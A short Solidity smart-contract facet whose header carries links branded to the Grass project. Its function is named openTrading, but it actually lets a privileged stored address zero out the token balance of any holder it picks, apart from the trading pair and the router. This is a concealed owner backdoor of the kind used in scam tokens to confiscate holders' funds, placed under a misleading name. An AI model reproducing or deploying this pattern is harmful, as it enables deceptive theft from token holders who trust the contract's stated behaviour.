/*  
   * SPDX-License-Identifier: MIT
   * Twitter: https://twitter.com/getgrass_io
   * Website: https://www.getgrass.io/
   * Discord Chat: https://discord.gg/8NxzRj9ayN
   
*/
pragma solidity ^0.8.25;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
